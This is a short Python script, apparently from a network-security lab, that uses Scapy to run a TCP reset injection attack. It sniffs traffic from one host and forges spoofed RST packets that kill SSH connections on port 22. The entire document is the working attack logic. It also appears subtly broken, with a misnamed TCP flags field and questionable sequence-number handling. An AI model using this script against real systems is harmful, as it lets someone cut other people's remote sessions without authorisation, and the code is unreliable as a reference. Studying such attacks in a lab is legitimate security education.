from scapy.all import *

def spoof_pkt(pkt):
    if pkt[TCP].dport==22 :
        ip = IP(src=pkt[IP].src,dst=pkt[IP].dst)
        tcp=TCP(sport=pkt[TCP].sport,dport=22,flag="R",seq=pkt[TCP].seq+1)
        pkt = ip/tcp
        send(pkt,verbose=0)
        print("send a packet\n")

f= 'tcp and src host 192.168.232.164'
pkt = sniff(filter=f,prn=spoof_pkt)
